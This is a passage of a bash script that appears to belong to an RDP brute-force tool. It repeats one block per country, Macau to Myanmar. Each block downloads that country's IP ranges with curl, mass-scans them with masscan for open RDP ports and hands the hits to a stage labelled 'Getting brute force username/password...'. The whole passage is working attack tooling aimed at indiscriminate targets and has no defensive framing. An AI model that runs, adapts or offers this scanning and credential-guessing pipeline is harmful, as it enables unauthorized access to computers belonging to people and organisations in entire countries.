echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "108" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MACAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Macau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "109" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MACEDONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Macedonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "110" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MADAGASCAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Madagascar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "111" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALAWI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malawi://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "112" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALAYSIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malaysia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "113" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALDIVES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Maldives://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "114" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mali://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "115" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALTA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malta://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "116" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MAURITANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mauritania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "117" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MAURITIUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mauritius://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "118" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MEXICO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mexico://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "119" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MICRONESIA+FEDERATED+STATES+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Micronesia Federated States of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "120" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOLDOVA+REPUBLIC+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Moldova Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "121" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONACO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Monaco://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "122" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONGOLIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mongolia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "123" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOROCCO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Morocco://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "124" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOZAMBIQUE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mozambique://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "125" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MYANMAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Myanmar://g">list
